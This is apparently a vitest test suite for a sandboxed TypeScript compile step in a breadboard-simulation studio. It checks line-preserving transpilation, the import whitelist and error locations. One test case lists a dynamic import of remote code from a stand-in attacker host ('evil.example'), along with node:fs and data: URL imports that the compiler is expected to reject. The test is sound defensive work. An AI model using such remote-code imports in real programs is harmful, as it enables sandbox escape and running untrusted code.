import { describe, expect, it } from 'vitest';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { transform } from 'sucrase';
import type { ProgramAsset } from '@breadboard-studio/schema';
import { compileStudioTs, scanImportSpecifiers } from '../src/runtime/compile.js';
import { SIM_DIAGNOSTIC_SEVERITY } from '../src/types.js';

const FIXTURE = join(import.meta.dirname, '..', '..', '..', 'examples', 'touch_display.breadboard.json');

function program(source: string, id = 'program_main'): ProgramAsset {
  return { id, name: '测试程序', target_component_id: 'mcu', language: 'studio-ts', source };
}

function fixtureProgram(): ProgramAsset {
  const design = JSON.parse(readFileSync(FIXTURE, 'utf8')) as { programs?: ProgramAsset[] };
  const found = design.programs?.find((p) => p.id === 'program_main');
  if (!found) throw new Error('fixture program_main missing');
  return found;
}

describe('compileStudioTs', () => {
  it('C1 keeps the fixture line-for-line: 25 lines in, 25 lines out', () => {
    const asset = fixtureProgram();
    expect(asset.source.split('\n').length).toBe(25);

    const result = compileStudioTs(asset, transform);
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.filename).toBe('program_main');
    expect(result.code.split('\n').length).toBe(25);

    // The lines that carry executable statements must not move: a QuickJS frame
    // `at loop (program_main:20:3)` has to point at the same line the user sees.
    const before = asset.source.split('\n');
    const after = result.code.split('\n');
    for (const needle of ['const TOUCH = 4;', 'Serial.begin(115200);', 'await oled.show();']) {
      expect(after.indexOf(after.find((l) => l.includes(needle)) ?? '')).toBe(
        before.indexOf(before.find((l) => l.includes(needle)) ?? '')
      );
    }
  });

  it('C2 strips type annotations without moving any line', () => {
    const source = ['const a: number = 1;', 'interface Shape {', '  side: number;', '}', 'export const b: Shape = { side: a };'].join('\n');
    const result = compileStudioTs(program(source), transform);
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.code.split('\n').length).toBe(5);
    expect(result.code).toContain('const a = 1;');
    expect(result.code).not.toContain(': number');
  });

  it('C3 accepts both whitelisted guest modules', () => {
    const source = ["import { gpio } from '@bbs/runtime';", "import { SSD1306 } from '@bbs/devices/ssd1306';", 'export const x = [gpio, SSD1306];'].join('\n');
    expect(compileStudioTs(program(source), transform).ok).toBe(true);
  });

  it('C4 rejects an illegal import whose binding is never used', () => {
    // sucrase deletes an unused import outright, so the module loader would
    // never see it: the pre-transform scan is the only thing that catches this.
    const source = ["import fs from 'node:fs';", "import { gpio } from '@bbs/runtime';", 'export function setup() { gpio.pinMode(1, 1); }'].join('\n');
    expect(transform(source, { transforms: ['typescript'], filePath: 'program_main' }).code).not.toContain('node:fs');

    const result = compileStudioTs(program(source), transform);
    expect(result.ok).toBe(false);
    if (result.ok) return;
    expect(result.diagnostic.code).toBe('program_compile_error');
    expect(result.diagnostic.severity).toBe(SIM_DIAGNOSTIC_SEVERITY.program_compile_error);
    expect(result.diagnostic.message).toContain('node:fs');
    expect(result.diagnostic.source).toEqual({ programId: 'program_main', line: 1, column: 16 });
  });

  it('C5 rejects every illegal import form', () => {
    const cases: Array<[string, string]> = [
      ["import fs from 'node:fs';", 'node:fs'],
      ["import './helper.js';", './helper.js'],
      ["const m = await import('https://evil.example/x.js');", 'https://evil.example/x.js'],
      ["export { readFile } from 'node:fs';", 'node:fs'],
      ["import { x } from '@bbs/devices/nope';", '@bbs/devices/nope'],
      ["import x from 'data:text/javascript,export default 1';", 'data:text/javascript,export default 1']
    ];
    for (const [source, specifier] of cases) {
      const result = compileStudioTs(program(source), transform);
      expect(result.ok, source).toBe(false);
      if (result.ok) continue;
      expect(result.diagnostic.code).toBe('program_compile_error');
      expect(result.diagnostic.message, source).toContain(specifier);
    }
  });

  it('C6 reports the illegal import at its own line, not at line 1', () => {
    const source = ["import { gpio } from '@bbs/runtime';", '', "import fs from 'node:fs';", 'export const x = [gpio, fs];'].join('\n');
    const result = compileStudioTs(program(source), transform);
    expect(result.ok).toBe(false);
    if (result.ok) return;
    expect(result.diagnostic.source?.line).toBe(3);
  });

  it('C7 does not mistake an import mentioned in a comment or a string for a real one', () => {
    const source = [
      "// import fs from 'node:fs' is not allowed",
      "/* import { x } from 'node:crypto'; */",
      'const hint = "import fs from \'node:fs\'";',
      "import { gpio } from '@bbs/runtime';",
      'export const x = [hint, gpio];'
    ].join('\n');
    expect(scanImportSpecifiers(source).map((s) => s.specifier)).toEqual(['@bbs/runtime']);
    expect(compileStudioTs(program(source), transform).ok).toBe(true);
  });

  it('C8 uses sucrase e.loc when it is present', () => {
    const result = compileStudioTs(program('const a: number = ;'), transform);
    expect(result.ok).toBe(false);
    if (result.ok) return;
    expect(result.diagnostic.source).toEqual({ programId: 'program_main', line: 1, column: 19 });
  });

  it('C9 falls back to (1,1) when sucrase throws without e.loc', () => {
    let thrown: unknown;
    try {
      transform('const a = @;', { transforms: ['typescript'], filePath: 'program_main' });
    } catch (error) {
      thrown = error;
    }
    // Guard the premise: if sucrase ever starts attaching loc here, the
    // fallback below stops being the thing under test.
    expect(thrown).toBeDefined();
    expect((thrown as { loc?: unknown }).loc).toBeUndefined();

    const result = compileStudioTs(program('const a = @;'), transform);
    expect(result.ok).toBe(false);
    if (result.ok) return;
    expect(result.diagnostic.code).toBe('program_compile_error');
    expect(result.diagnostic.source).toEqual({ programId: 'program_main', line: 1, column: 1 });
  });

  it('C10 lets through what sucrase cannot check, leaving evalCode as the backstop', () => {
    // Documented in plan §2.2: sucrase is a transpiler, not a validator.
    const result = compileStudioTs(program('const c = @@;'), transform);
    expect(result.ok).toBe(true);
  });

  it('C11 names the program id as the filename so QuickJS frames map back', () => {
    const result = compileStudioTs(program('export const a = 1;', 'program_abc'), transform);
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.filename).toBe('program_abc');
  });
});

describe('scanImportSpecifiers', () => {
  it('C12 finds static, bare, dynamic and re-export requests in source order', () => {
    const source = [
      "import { a } from '@bbs/runtime';",
      "import '@bbs/devices/ssd1306';",
      "export { b } from 'node:path';",
      "const c = import('node:os');",
      'export const d = [a, c];'
    ].join('\n');
    expect(scanImportSpecifiers(source)).toEqual([
      { specifier: '@bbs/runtime', line: 1, column: 19 },
      { specifier: '@bbs/devices/ssd1306', line: 2, column: 8 },
      { specifier: 'node:path', line: 3, column: 19 },
      { specifier: 'node:os', line: 4, column: 18 }
    ]);
  });

  it('C13 handles a multi-line import clause', () => {
    const source = ['import {', '  gpio,', '  Serial', "} from '@bbs/runtime';"].join('\n');
    expect(scanImportSpecifiers(source).map((s) => s.specifier)).toEqual(['@bbs/runtime']);
    expect(scanImportSpecifiers(source)[0]?.line).toBe(4);
  });

  it('C14 does not fire on identifiers that merely start with import', () => {
    const source = ["const important = 'node:fs';", 'export const x = important;'].join('\n');
    expect(scanImportSpecifiers(source)).toEqual([]);
  });
});
